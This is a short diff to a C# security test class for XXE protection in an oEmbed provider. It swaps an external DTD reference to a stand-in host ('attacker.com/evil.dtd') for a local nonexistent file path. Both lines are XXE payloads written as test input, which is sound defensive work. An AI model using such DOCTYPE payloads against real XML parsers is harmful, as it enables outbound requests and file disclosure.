@@ -47,7 +47,7 @@ public class OEmbedProviderXxeSecurityTests
     [TestCase(
         """
         <?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE oembed SYSTEM "http://attacker.com/evil.dtd">
+        <!DOCTYPE oembed SYSTEM "file:///nonexistent/evil.dtd">
         <oembed>
           <type>photo</type>
           <url>https://example.com/photo.jpg</url>
